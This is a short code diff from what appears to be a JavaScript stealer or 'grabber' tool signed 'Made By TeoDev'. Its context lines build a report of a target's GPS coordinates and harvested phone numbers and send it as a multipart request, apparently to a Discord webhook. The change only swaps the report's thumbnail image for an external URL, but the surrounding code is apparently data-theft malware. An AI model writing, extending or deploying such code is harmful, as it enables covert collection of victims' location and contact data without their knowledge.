@@ -132,14 +132,14 @@ ${latitude && longitude ? `**Coordinates:** ${latitude}, ${longitude}` : ''}
 **Phone numbers:** ${fpn().join(', ') || 'None Found'}
 `;
 
-    // Build embed object
+    // Build embed object with thumbnail URL
     const embed = {
       title: "£𝖆𝖌𝖊 𝖗𝖊𝖆𝖕𝖊𝖗",
       description: description,
       color: 0x800080,
       timestamp: new Date().toISOString(),
       footer: { text: "Made By TeoDev" },
-      thumbnail: { url: "attachment://pfp.png" }
+      thumbnail: { url: "https://cdn.pfps.gg/pfps/3077-reaper.png" }
     };
 
     // Prepare FormData for multipart request
